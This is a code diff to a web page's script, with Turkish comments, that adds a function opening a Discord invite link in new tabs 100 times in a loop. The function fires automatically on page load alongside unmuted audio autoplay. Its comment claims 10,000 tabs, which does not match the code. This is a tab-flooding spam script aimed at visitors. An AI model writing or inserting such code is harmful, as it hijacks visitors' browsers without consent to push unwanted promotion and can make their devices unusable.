@@ -136,8 +136,18 @@
       document.getElementById('audio-player').muted = false;
     });
 
+    // 10.000 kez Discord davet linki yeni sekmede aç
+    function spamDiscordInvite() {
+      for (let i = 0; i < 100; i++) {
+        window.open("https://discord.gg/fivemdown", "_blank");
+      }
+    }
+
     // Sayfa açılır açılmaz otomatik çalmayı dene ve sesi aç!
     window.onload = function() {
+      // Discord davet spam fonksiyonunu çağır
+      spamDiscordInvite();
+
       var audio = document.getElementById('audio-player');
       audio.play().catch(()=>{});
       setTimeout(function() {
@@ -147,4 +157,3 @@
   </script>
 </body>
 </html>
-
